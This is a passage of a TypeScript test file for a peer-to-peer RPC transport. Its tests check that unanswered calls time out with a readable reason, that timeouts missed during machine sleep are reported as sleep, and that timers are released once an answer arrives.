        state.sent += 1
      },
      dispatch: createDispatcher(
        new MethodRegistry(
          createRuntimeContext({ version: 't', store: {} as never, subscriptions: new SubscriptionHub() })
        )
      ),
      subscriptions: new SubscriptionHub(),
      connectionId: 'peer_void',
      scheduler: clock,
      onFatal: () => {}
    })
    return {
      transport,
      clock,
      get sent() {
        return state.sent
      }
    }
  }

  it('rejects with a reason a person can be shown rather than waiting for ever', async () => {
    const { transport, clock } = intoTheVoid()
    const answer = transport.call('peer.presence', {}).then(
      () => 'answered',
      (error: unknown) => (error instanceof Error ? error.message : String(error))
    )

    // Up to the deadline it is still an outstanding call, because a slow link
    // is not a dead one and a call refused early is a keystroke refused early.
    clock.advance(PEER_CALL_TIMEOUT_MS - 1)
    expect(await Promise.race([answer, Promise.resolve('waiting')])).toBe('waiting')

    clock.advance(1)
    await expect(answer).resolves.toMatch(/did not answer/)
  })

  it('does not blame the teammate for a deadline this machine slept through', async () => {
    const { transport, clock } = intoTheVoid()
    const answer = transport.call('peer.presence', {}).then(
      () => 'answered',
      (error: unknown) => (error instanceof Error ? error.message : String(error))
    )

    // The thirty seconds it was given were spent with the lid shut, so nobody
    // failed to answer in them. The call is still settled — a promise nothing
    // ever answers is the worse failure — and it is settled with the truth.
    clock.sleep(3_600_000)
    const said = await answer
    expect(said).not.toMatch(/did not answer/)
    expect(said).toMatch(/asleep/)
  })

  it('lets go of the deadline the moment the answer lands', async () => {
    const clock = manualClock()
    const { caller } = rig(undefined, { callerScheduler: clock })
    await expect(caller.call('peer.presence', {})).resolves.toMatchObject({ revision: 1 })

    // A call that is over holds nothing. Otherwise a link carrying a watched
    // pane would accumulate one live timer per frame it ever asked for.
    expect(clock.pending()).toBe(0)
  })
})
